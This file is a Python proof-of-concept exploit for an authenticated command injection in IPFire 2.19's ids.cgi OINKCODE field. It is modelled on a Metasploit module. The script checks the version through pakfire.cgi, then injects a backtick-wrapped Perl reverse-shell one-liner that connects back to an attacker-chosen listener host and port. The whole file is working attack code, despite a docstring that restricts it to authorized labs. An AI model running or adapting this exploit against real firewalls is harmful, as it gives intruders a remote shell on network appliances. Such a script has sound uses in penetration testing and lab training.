#!/usr/bin/env python
from __future__ import print_function
"""
IPFire 2.19 OINKCODE command-injection PoC

Use only against an IPFire instance for which you have explicit
authorization, such as a private training lab.

The version check follows the logic of the Metasploit module.  The exploit
request follows its success criterion: a non-200 response is treated as a
rejected request/invalid authentication; a 200 response (or a read timeout
after dispatch) means that the request was accepted, but does not by itself
prove that a reverse shell reached the listener.
"""

import argparse
import getpass
import re
import sys

import requests
from requests.exceptions import ConnectionError, ReadTimeout, RequestException
from urllib3.exceptions import InsecureRequestWarning


VERSION_RE = re.compile(
    r"IPFire\s+([\d.]+)\s+\([\w.-]+\)\s*-\s*Core\s+Update\s+(\d+)",
    re.IGNORECASE,
)


def build_base_url(target, scheme, web_port):
    """Build a base URL from a host/IP or accept a complete URL."""
    target = target.rstrip("/")
    if re.match(r"^https?://", target, re.IGNORECASE):
        return target
    return "{0}://{1}:{2}".format(scheme, target, web_port)


def version_tuple(version):
    return tuple(int(part) for part in version.split("."))


def is_supported_version(version, update):
    """Mirror the Metasploit check: version <= 2.19 and core update <= 110."""
    return version_tuple(version) <= version_tuple("2.19") and update <= 110


def build_headers(ids_url):
    return {
        "Accept-Encoding": "gzip, deflate",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "User-Agent": "IPFIRE-Authorized-Lab-PoC",
        "Referer": ids_url,
        "Upgrade-Insecure-Requests": "1",
    }


def build_perl_payload(lhost, lport, perl_path):
    """Use the command string from Metasploit's cmd/unix/reverse_perl payload."""
    return (
        "{0} -MIO -e ".format(perl_path)
        + "'$p=fork;exit,if($p);"
        + "foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}"
        + '$c=new IO::Socket::INET(PeerAddr,"{0}:{1}");'.format(lhost, lport)
        + "STDIN->fdopen($c,r);$~->fdopen($c,w);"
        + "while(<>){if($_=~ /(.*)/){system $1;}};'"
    )


def check_version(session, base_url, timeout):
    """Perform the same version-oriented check used by Metasploit."""
    url = "{0}/cgi-bin/pakfire.cgi".format(base_url)
    print("[*] Checking version: {0}".format(url))

    try:
        response = session.get(url, timeout=timeout, allow_redirects=False)
    except ReadTimeout:
        print("[-] Version check timed out.")
        return False, None, None
    except RequestException as exc:
        print("[-] Version check failed: {0}".format(exc))
        return False, None, None

    if response.status_code != 200:
        print("[-] No valid version response (HTTP {0}).".format(response.status_code))
        if response.status_code in (401, 403):
            print("[-] Check the username/password and the authorization header.")
        return False, None, None

    match = VERSION_RE.search(response.text)
    if not match:
        print("[-] No recognizable IPFire version found; Metasploit would mark it Safe.")
        print("    Use --skip-version-check only when the target version is already confirmed.")
        return False, None, None

    version = match.group(1)
    update = int(match.group(2))
    print("[+] IPFire {0}, Core Update {1}".format(version, update))

    if not is_supported_version(version, update):
        print("[-] Version/Core Update is outside the Metasploit module's supported range.")
        return False, version, update

    print("[+] Target appears vulnerable according to the Metasploit version check.")
    return True, version, update


def send_payload(session, base_url, payload, timeout):
    """Send the OINKCODE payload and apply Metasploit's HTTP result logic."""
    ids_url = "{0}/cgi-bin/ids.cgi".format(base_url)
    form_data = {
        "ENABLE_SNORT_GREEN": "on",
        "ENABLE_SNORT": "on",
        "RULES": "registered",
        "OINKCODE": "`{0}`".format(payload),
        "ACTION": "Download new ruleset",
        "ACTION2": "snort",
    }

    print("[*] Sending Perl reverse-shell payload to {0}".format(ids_url))
    try:
        response = session.post(
            ids_url,
            data=form_data,
            headers=build_headers(ids_url),
            timeout=timeout,
            allow_redirects=False,
        )
    except ReadTimeout:
        # A command-shell payload can keep the CGI request open.  This is the
        # closest requests equivalent to Metasploit receiving no response.
        print("[+] No response before timeout; the CGI may be blocked by the payload.")
        print("[+] Check the listener for the reverse shell.")
        return True
    except ConnectionError as exc:
        print("[-] Could not connect to the web service: {0}".format(exc))
        return False
    except RequestException as exc:
        print("[-] Exploit request failed: {0}".format(exc))
        return False

    # This intentionally does not inspect response.text.  Metasploit only
    # treats a non-200 response as a rejected request/invalid credentials.
    if response.status_code != 200:
        print(
            "[-] Request rejected (HTTP {0}); check credentials, URL and port."
            .format(response.status_code)
        )
        return False

    print("[+] HTTP 200 received; request was accepted by ids.cgi.")
    print("[+] A normal HTML response is expected and is not a false negative.")
    print("[+] Check the listener for the reverse shell.")
    return True


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        description="Authorized-lab IPFire 2.19 OINKCODE RCE PoC"
    )
    parser.add_argument(
        "-t",
        "--target",
        required=True,
        help="Target host/IP or complete base URL (e.g. 172.16.1.155 or https://172.16.1.155:444)",
    )
    parser.add_argument(
        "--scheme",
        choices=("http", "https"),
        default="https",
        help="Scheme when --target is a host/IP (default: https)",
    )
    parser.add_argument(
        "--web-port",
        type=int,
        default=444,
        help="IPFire web-interface port when --target is a host/IP (default: 444)",
    )
    parser.add_argument("-u", "--username", default="admin", help="IPFire username (default: admin)")
    parser.add_argument(
        "-p",
        "--password",
        help="IPFire password; if omitted, read it without echoing",
    )
    parser.add_argument("--lhost", required=True, help="Listener IP reachable from IPFire")
    parser.add_argument("--lport", type=int, default=4444, help="Listener port (default: 4444)")
    parser.add_argument(
        "--perl-path",
        default="perl",
        help="Perl executable on IPFire (default: perl; equivalent to Metasploit PerlPath)",
    )
    parser.add_argument(
        "--timeout",
        type=float,
        default=10.0,
        help="HTTP timeout in seconds (default: 10)",
    )
    parser.add_argument(
        "-k",
        "--insecure",
        action="store_true",
        help="Disable TLS certificate verification (needed for the usual self-signed IPFire certificate)",
    )
    parser.add_argument(
        "--skip-version-check",
        action="store_true",
        help="Skip pakfire.cgi version fingerprinting and send the payload directly",
    )
    parser.add_argument(
        "--check-only",
        action="store_true",
        help="Only perform the Metasploit-like version check",
    )
    return parser.parse_args()


def main() -> int:
    args = parse_args()
    password = args.password if args.password is not None else getpass.getpass("IPFire password: ")
    base_url = build_base_url(args.target, args.scheme, args.web_port)

    if args.insecure:
        requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

    session = requests.Session()
    session.auth = (args.username, password)
    session.verify = not args.insecure

    if not args.skip_version_check:
        appears, _, _ = check_version(session, base_url, args.timeout)
        if args.check_only:
            return 0 if appears else 1
        if not appears:
            print("[-] Aborting before exploitation.")
            return 1
    elif args.check_only:
        print("[-] --check-only cannot be combined with --skip-version-check.")
        return 1

    payload = build_perl_payload(args.lhost, args.lport, args.perl_path)
    return 0 if send_payload(session, base_url, payload, args.timeout) else 1


if __name__ == "__main__":
    sys.exit(main())
